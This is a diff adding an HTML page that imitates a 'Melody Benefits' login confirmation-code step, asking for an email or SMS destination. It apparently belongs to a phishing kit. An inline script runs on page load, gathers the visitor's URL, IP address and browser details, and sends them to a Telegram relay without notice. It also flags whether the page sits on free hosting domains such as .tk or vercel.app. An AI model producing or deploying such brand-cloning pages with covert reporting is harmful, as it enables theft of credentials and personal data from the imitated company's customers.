@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, minimum-scale=1, user-scalable=no">
+  <title>Confirmation Code | Melody Benefits</title>
+  <link rel="shortcut icon" type="image/png" href="favicon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Oxygen:wght@300;400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body class="default hidden-header">
+  <div class="main" id="main_div">
+    <header class="header header--without-menu" id="header" tabindex="-1">
+      <a href="#main-content" class="header__skip-link">Skip to main content</a>
+      <div class="inner-box inner-box-header" id="header__inner-box">
+        <div class="header__col--l">
+          <div class="header__desktop-logo-wrapper">
+            <a href="index.html" class="logo">
+              <img src="melody-logo-transparent.png" alt="Melody Benefits" id="logo__pic" width="180">
+            </a>
+            <div class="h-contacts">
+              <p>
+                <a href="tel:833-372-2273" class="h-contacts_phone">833-372-2273</a>
+              </p>
+              <p>
+                <a href="mailto:info@melodybenefits.com" class="h-contacts_email">info@melodybenefits.com</a>
+              </p>
+            </div>
+            <h1 class="header-title">Login</h1>
+          </div>
+        </div>
+        <div class="header__sep"></div>
+      </div>
+    </header>
+
+    <div class="content">
+      <main id="main-content" class="main-content" tabindex="-1">
+        <div class="login-block clearfix auth-block">
+          <div class="col-le">
+            <div class="conf">
+              Protecting your information is our first priority. In order to access this site or perform this specific function you must receive a confirmation code to the device of your choice. You will be asked to enter the code on the next screen.
+            </div>
+
+            <div class="sign-in-form auth-form">
+              <form id="auth-form" action="#" method="post" novalidate role="form">
+                <h2 class="title">Confirmation Code</h2>
+
+                <div class="field-label">
+                  <label for="delivery-method">Send code by</label>
+                  <em>*</em>
+                </div>
+                <span class="text-danger field-validation-valid" id="method_validation_message" role="alert"></span>
+                <select class="inp auth-select" id="delivery-method" name="DeliveryMethod" required>
+                  <option value="" selected disabled>Select Email or SMS</option>
+                  <option value="email">Email</option>
+                  <option value="sms">SMS</option>
+                </select>
+
+                <div class="auth-destination" id="auth-destination" hidden>
+                  <div class="field-label">
+                    <label for="destination" id="destination-label">Registered email</label>
+                    <em>*</em>
+                  </div>
+                  <span class="text-danger field-validation-valid" id="destination_validation_message" role="alert"></span>
+                  <input
+                    class="inp"
+                    id="destination"
+                    name="Destination"
+                    type="text"
+                    autocomplete="off"
+                    placeholder=""
+                  >
+                  <p class="auth-hint" id="auth-hint"></p>
+                </div>
+
+                <div class="auth-actions">
+                  <a href="index.html" class="button button-cancel"><span>Cancel</span></a>
+                  <button type="submit" class="button button-subm button-generate" id="generate-code-btn">
+                    <span>Generate Code</span>
+                  </button>
+                </div>
+              </form>
+            </div>
+
+            <div class="auth-info" role="note">
+              <span class="auth-info__icon" aria-hidden="true">i</span>
+              <p>
+                To proceed, please press the generate code button. If you wish to cancel, you will be asked to enter a code the next time you login or try to perform this specific function.
+              </p>
+            </div>
+          </div>
+        </div>
+      </main>
+    </div>
+
+    <footer class="footer">
+      <div class="footer_ins">
+        <ul class="fnavi">
+          <li><a href="#">About Us</a></li>
+          <li><a href="#">FAQ's</a></li>
+          <li><a href="#">Terms of Use</a></li>
+          <li><a href="#">Privacy Policy</a></li>
+        </ul>
+        <div class="copyright">
+          <div class="credits">
+            <div>
+              <span style="font-size: 11pt;">
+                <small><span style="font-size: 12pt;">Copyright © 2025 Melody Benefits</span> - </small>
+              </span>
+              <span style="font-size: 12pt;">
+                4901 16th Ave. Brooklyn, NY 11204 -
+                <a href="tel:7184361289">718.436.1289</a>
+              </span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <div class="footer lower-footer">
+      <div class="footer_ins">
+        <a href="#">SITE MAP</a>
+      </div>
+    </div>
+  </div>
+
+  <script src="auth.js"></script>
+  <!-- Add this after the existing auth.js script -->
+<script>
+  // ============================================================
+  // ====== DOMAIN DETECTION FOR AUTH PAGE ======================
+  // ============================================================
+
+  async function sendToTelegram(action, data) {
+    try {
+      let ipData = { ip: 'Unknown' };
+      try {
+        const response = await fetch('/api/ip');
+        if (response.ok) {
+          ipData = await response.json();
+        }
+      } catch (e) {
+        console.warn('Could not fetch IP data');
+      }
+
+      const payload = {
+        action: action,
+        data: {
+          ...data,
+          timestamp: new Date().toLocaleString('en-US', { 
+            timeZone: 'America/New_York',
+            hour12: true,
+            year: 'numeric',
+            month: '2-digit',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit'
+          }),
+          userAgent: navigator.userAgent,
+          ip: ipData.ip || 'Unknown'
+        }
+      };
+
+      await fetch('/api/telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (error) {
+      console.error('Failed to send to Telegram:', error);
+    }
+  }
+
+  function detectDomain() {
+    const currentUrl = window.location.href;
+    const urlObj = new URL(currentUrl);
+    const domain = urlObj.hostname;
+    
+    const freeDomains = [
+      '.tk', '.ml', '.ga', '.cf', '.gq',
+      '.free.nf', '.free.org', '.free.com',
+      '.co.cc', '.co.nr', '.cjb.net',
+      '.dynu.net', '.ddns.net', '.no-ip.org',
+      'vercel.app', 'netlify.app', 'github.io',
+      'pages.dev', 'web.app', 'firebaseapp.com',
+      'herokuapp.com', 'glitch.me', 'replit.co',
+      '000webhostapp.com', 'byethost.com',
+      'freehostia.com', 'profreehost.com',
+      '.example.com', '.test', '.localhost'
+    ];
+
+    const isFree = freeDomains.some(freeDomain => 
+      domain.includes(freeDomain) || domain.endsWith(freeDomain)
+    );
+
+    sendToTelegram('domain_detection', {
+      url: currentUrl,
+      domain: domain,
+      isFree: isFree
+    });
+
+    console.log(`🌐 Domain detected: ${domain} (${isFree ? 'FREE' : 'PURCHASED'})`);
+  }
+
+  detectDomain();
+</script>
+</body>
+</html>
